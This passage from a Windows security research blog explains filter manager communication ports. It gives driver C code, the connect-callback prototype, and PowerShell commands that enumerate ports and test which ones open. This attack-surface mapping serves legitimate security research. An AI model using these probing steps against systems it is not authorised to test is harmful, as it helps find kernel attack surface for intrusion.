the driver can&amp;rsquo;t create one for its own purposes. A typical attack vector is the malicious user opens a handle to the device object and sends device IO control codes to exercise the vulnerable behavior.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;I&amp;rsquo;m not going to go into details about how to analyze Windows kernel drivers for security issues in the IRP dispatch callbacks, as there&amp;rsquo;s plenty of other resources. For example: Reverse Engineering and Bug Hunting on KMDF Drivers (&lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://www.youtube.com/watch?v=puNkbSTQtXY"&gt;video&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://ioactive.com/wp-content/uploads/2018/09/Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers.pdf"&gt;slides&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;).&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.46kxf48l7kwf"&gt;&lt;span class="c5"&gt;Filter Communication Ports&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;One unique communication mechanism which is implemented by the filter manager is Filter Communication Ports. A port can be created by a mini-filter driver by calling the exported filter manager API &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltcreatecommunicationport"&gt;FltCreateCommunicationPort&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8bdba4f3314845fcc006a96e87b1e70812f9a12f"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;PSECURITY_DESCRIPTOR SecurityDescriptor&lt;/span&gt;&lt;span class="c9 c40"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c9 c40"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;FltBuildDefaultSecurityDescriptor&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;SecurityDescriptor&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c30 c4"&gt;&amp;nbsp; FLT_PORT_ALL_ACCESS&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9 c40"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c9 c40"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;UNICODE_STRING Name&lt;/span&gt;&lt;span class="c9 c40"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;RtlInitUnicodeString&lt;/span&gt;&lt;span class="c9"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;Name&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c76"&gt;L&amp;quot;\\FilterPortName&amp;quot;&lt;/span&gt;&lt;span class="c9 c40"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c9 c40"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;OBJECT_ATTRIBUTES ObjAttr&lt;/span&gt;&lt;span class="c9 c40"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;InitializeObjectAttributes&lt;/span&gt;&lt;span class="c9"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;ObjAttr&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;Name&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c32 c23"&gt;NULL&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;SecurityDescriptor&lt;/span&gt;&lt;span class="c9 c40"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c9 c40"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;PFLT_PORT Port&lt;/span&gt;&lt;span class="c9 c40"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;FltCreateCommunicationPort&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; Filter&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;Port&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;ObjAttr&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;NULL&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; ConnectNotifyCallback&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; DisconnectNotifyCallback&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; MessageNotifyCallback&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c4 c40 c36"&gt;100&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The name of the port is specified using an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes"&gt;OBJECT_ATTRIBUTES&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure, in this example the filter port will be called &lt;/span&gt;&lt;span class="c21"&gt;\FilterPortName&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the Object Manager Namespace (OMNS). The driver should also specify the security descriptor to be associated with the port through the OBJECT_ATTRIBUTES. It&amp;rsquo;s most common to call the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltbuilddefaultsecuritydescriptor"&gt;FltBuildDefaultSecurityDescriptor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API to build a security descriptor which only grants administrators access to the port. However, the driver can configure the security any way it likes.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;In &lt;/span&gt;&lt;span class="c21"&gt;FltCreateCommunicationPort &lt;/span&gt;&lt;span&gt;the filter manager creates a new named kernel object of type &lt;/span&gt;&lt;span class="c21"&gt;FilterConnectionPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the &lt;/span&gt;&lt;span class="c21"&gt;OBJECT_ATTRIBUTES&lt;/span&gt;&lt;span&gt;&amp;nbsp;and associates it with the callbacks. There&amp;rsquo;s no &lt;/span&gt;&lt;span class="c21"&gt;NtOpenFilterConnectionPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;system call to open a port. Instead when a user wants to access the port it must first open a handle to the filter manager message device object, &lt;/span&gt;&lt;span class="c21"&gt;\FileSystem\Filters\FltMgrMsg,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;passing an extended attributes structure identifying the full OMNS path to the port. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;It is much easier to open a port by calling the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows/win32/api/fltuser/nf-fltuser-filterconnectcommunicationport"&gt;FilterConnectCommunicationPort&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API in user-mode, so you don&amp;rsquo;t need to deal with connecting manually. When opening a port you can also specify an arbitrary context buffer to pass to the connect callback. This can be used to configure the open port instance. On connection the connect notification callback passed to &lt;/span&gt;&lt;span class="c21"&gt;FltCreateCommunicationPort&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;will be called. The prototype for the callback is as follows:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cda7dea4e71bdd0516f20f983c060c2db3b5e178"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c32 c23"&gt;typedef&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;NTSTATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;(*&lt;/span&gt;&lt;span class="c4"&gt;PFLT_CONNECT_NOTIFY&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PFLT_PORT ClientPort&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PVOID ServerPortCookie&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PVOID ConnectionContext&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ULONG SizeOfContext&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PVOID &lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c30 c4"&gt;ConnectionPortCookie&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c21"&gt;ConnectionContext &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c21"&gt;SizeOfContext &lt;/span&gt;&lt;span&gt;are values passed from user-mode when calling &lt;/span&gt;&lt;span class="c21"&gt;FilterConnectCommunicationPort&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class="c21"&gt;ConnectionContext&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;has its length verified and copied into kernel memory before use. However, there&amp;rsquo;s no structure for the context so the driver must still carefully verify its contents before using it. The driver can reject a caller by returning an error NT status code. This allows the driver to do things like verify the caller is in a signed binary or similar, which is likely something security products will do. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;If the connection is allowed the &lt;/span&gt;&lt;span class="c21"&gt;ConnectionPortCookie &lt;/span&gt;&lt;span&gt;pointer can be updated with a pointer to an allocated structure unique to the client. This pointer will be passed back to the driver in the message and disconnect notification callbacks.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;You can enumerate what ports are currently registered by inspecting the OMNS. For example, to enumerate the ports in the root of the OMNS using my &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.29"&gt;NtObjectManager&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;PowerShell module run the following command:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b48730e42b984f8aefd860bab2f83a8648877a83"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c17"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;ls&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c23 c48"&gt;NtObject:\&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;|&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Where-Object&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;TypeName&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-eq&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;FilterConnectionPort&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;TypeName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;-------- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;storqosfltport &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;MicrosoftMalwareProtectionRemoteIoPortWD &amp;nbsp;FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;MicrosoftMalwareProtectionVeryLowIoPortWD FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;WcifsPort &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;MicrosoftMalwareProtectionControlPortWD &amp;nbsp; FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;BindFltPort &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;MicrosoftMalwareProtectionAsyncPortWD &amp;nbsp; &amp;nbsp; FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;CLDMSGPORT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c17"&gt;MicrosoftMalwareProtectionPortWD &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c52 c21"&gt;You might notice there is also a FilterCommunicationPort kernel object type. This is the object used for the client-end where FilterConnectionPort is the mini-filter server end. You should never see a FilterCommunicationPort named object in the OMNS.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;When the port is opened the kernel will check the security descriptor for access. Unfortunately there&amp;rsquo;s no way to directly query the assigned security descriptor for a port from user-mode. The simplest way to test is to just try and open the port and see if it returns an access denied error.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0c025f7674fa78433d9239a02c6e713a4eb8861d"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$ports&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c23 c60"&gt;ls&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;NtObject:\&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;|&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c60 c23"&gt;Where-Object&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c48 c23"&gt;TypeName&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-eq&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;FilterConnectionPort&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c57 c23"&gt;foreach&lt;/span&gt;&lt;span class="c17 c23"&gt;(&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$port&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c23 c57"&gt;in&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$ports&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;.&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;Name) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Write-Host&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;\&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$port&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Use-NtObject&lt;/span&gt;&lt;span class="c17 c23"&gt;(&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$p&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Get-FilterConnectionPort&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;\&lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$port&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c30 c17 c23"&gt;) {}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c17 c23"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c30 c17 c23"&gt;\BindFltPort&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c30 c17 c23"&gt;Exception: &amp;quot;(0x80070005) - Access is denied.&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7 c8"&gt;&lt;span class="c30 c17 c23"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c30 c17 c23"&gt;\CLDMSGPORT&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c30 c17 c23"&gt;Exception: &amp;quot;(0x8007017C) - The cloud operation is invalid.&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;We can see two ports output in the previous code snippet. The &lt;/span&gt;&lt;span class="c21"&gt;BindFltPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;port &lt;/span&gt;&lt;span&gt;fails with an access denied error, while the &lt;/span&gt;&lt;span class="c21"&gt;CLDMSGPORT&lt;/span&gt;&lt;span&gt;&amp;nbsp;port &lt;/span&gt;&lt;span&gt;(which is part of the Cloud Filter driver) returns &amp;ldquo;The cloud operation is invalid.&amp;rdquo;. The second error indicates that we&amp;rsquo;ve likely opened the port, but you&amp;rsquo;ll need to supply specific parameters in the context buffer when calling the &lt;/span&gt;&lt;span class="c21"&gt;FilterConnectCommunicationPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. You can specify the connection context for the &lt;/span&gt;&lt;span class="c21"&gt;Get-FilterConnectionPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;command by specifying a byte array to the &lt;/span&gt;&lt;span class="c21"&gt;Context&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;parameter.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b1274d8821e94eefedfab722442a54dd3fb26c4d"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c17 c23"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c17 c42 c23"&gt;$port&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;=&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c60 c23"&gt;Get-FilterConnectionPort&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Path&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;&amp;quot;\PORT&amp;quot;&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c45 c23"&gt;-Context&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;@(&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;0&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;1&lt;/span&gt;&lt;span class="c17 c35 c23"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;2&lt;/span&gt;&lt;span class="c17 c23 c35"&gt;,&lt;/span&gt;&lt;span class="c17 c23"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c23"&gt;3&lt;/span&gt;&lt;span class="c17 c23"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;We can inspect the security descriptor for a port if you&amp;rsquo;ve got a Windows system with a kernel debugger enabled and a copy of WinDBG.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a4163d0806a5af0b5d7834b30d5954f0af6d0f60"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;0: kd&amp;gt; !object \CLDMSGPORT&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;Object: ffffb487447ff8c0 &amp;nbsp;Type: (ffffb4873d67dc40) FilterConnectionPort&lt;/span&gt;&lt;/p&gt;&lt;p 